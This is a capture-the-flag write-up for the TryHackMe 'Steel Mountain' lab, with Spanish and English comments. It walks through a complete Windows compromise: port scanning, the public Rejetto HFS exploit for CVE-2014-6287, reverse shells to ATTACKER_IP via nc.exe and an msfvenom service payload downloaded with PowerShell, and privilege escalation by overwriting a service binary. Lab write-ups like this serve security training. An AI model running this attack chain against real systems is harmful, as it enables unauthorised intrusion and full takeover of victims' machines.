# Steel Mountain - TryHackMe Writeup

## Recon

```bash
# What it does: escanea todos los puertos TCP rapido, sin DNS ni ping previo.
# Why here: encontrar la superficie completa antes de lanzar scripts de version.
nmap -sS -p- -n -Pn --min-rate 5000 $TARGET --open -oN silent

# What it does: ejecuta deteccion de version y scripts basicos sobre los puertos abiertos.
# Why here: identificar IIS, SMB, RDP, WinRM y el HTTP File Server en 8080.
nmap -sVC -p80,135,139,445,3389,5985,8080,47001,49152,49153,49154,49155,49156,49193,49194 $TARGET -oN service
```

Vemos HTTP abierto en los puertos 80 y 8080. Inspeccionando el puerto 8080 aparece Rejetto HTTP File Server, vulnerable a CVE-2014-6287.

## Explotacion

```bash
# What it does: busca exploits locales de Exploit-DB relacionados con Rejetto/HFS.
# Why here: confirmar que existe un PoC publico para la version detectada.
searchsploit rejetto http

# What it does: copia el exploit 39161.py al directorio actual.
# Why here: editar el PoC y ejecutarlo contra el HFS del puerto 8080.
searchsploit windows/remote/39161.py -m
```

Editar en el exploit:

```python
# What it does: configura la IP y puerto donde la victima devolvera la shell.
# Why here: adaptar el PoC a nuestra VPN/listener.
ip_addr = "ATTACKER_IP"
local_port = "443"
```

Copiamos `nc.exe`, servimos el binario y lanzamos el exploit:

```bash
# What it does: copia el netcat de Windows a /tmp para servirlo por HTTP.
# Why here: el exploit necesita que la victima descargue nc.exe para devolver shell.
cp /usr/share/windows-resources/binaries/nc.exe /tmp/

# What it does: levanta un servidor HTTP en el puerto 80 desde el directorio actual.
# Why here: permitir que la maquina Windows descargue nc.exe.
sudo python3 -m http.server 80

# What it does: opens a TCP listener with rlwrap for a more comfortable shell.
# Why here: recibir la reverse shell disparada por el exploit.
rlwrap nc -lvnp 443

# What it does: ejecuta el PoC contra el HFS de la victima.
# Why here: abusar CVE-2014-6287 y obtener una shell inicial.
/usr/bin/python2 39161.py $TARGET 8080
```

Navegamos al Desktop del usuario `bill` y obtenemos la flag.

## Privilege Escalation

```cmd
REM What it does: lista servicios instalados, mostrando nombre, display name, ruta del binario y modo de inicio.
REM Why here: detectar rutas fuera de C:\Windows que puedan ser modificables o vulnerables.
wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
```

Generamos un binario de servicio que abre reverse shell:

```bash
# What it does: crea un ejecutable de servicio Windows que conecta de vuelta al atacante.
# Why here: reemplazar el binario de un servicio vulnerable y ganar ejecucion como SYSTEM.
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```

Transferimos el payload y reemplazamos el servicio vulnerable:

```cmd
REM What it does: descarga el payload desde el servidor HTTP del atacante.
REM Why here: colocar el binario malicioso en la maquina victima.
powershell -c "Invoke-WebRequest -Uri http://ATTACKER_IP/Advanced.exe -OutFile Advanced.exe"

REM What it does: detiene el servicio vulnerable antes de sobrescribir su binario.
REM Why here: liberar el archivo ejecutable y preparar el reemplazo.
sc stop AdvancedSystemCareService9

REM What it does: sobrescribe el ejecutable legitimo del servicio con nuestro payload.
REM Why here: hacer que el servicio ejecute nuestra reverse shell al arrancar.
copy Advanced.exe ASCService.exe

REM What it does: inicia de nuevo el servicio.
REM Why here: disparar el payload como la cuenta privilegiada del servicio.
sc start AdvancedSystemCareService9
```

Con la shell privilegiada:

```cmd
REM What it does: imprime el usuario actual.
REM Why here: confirmar que la escalada llego a SYSTEM/root equivalente en Windows.
whoami

REM What it does: lee la flag final.
REM Why here: validar el compromiso completo de la maquina.
type root.txt
```


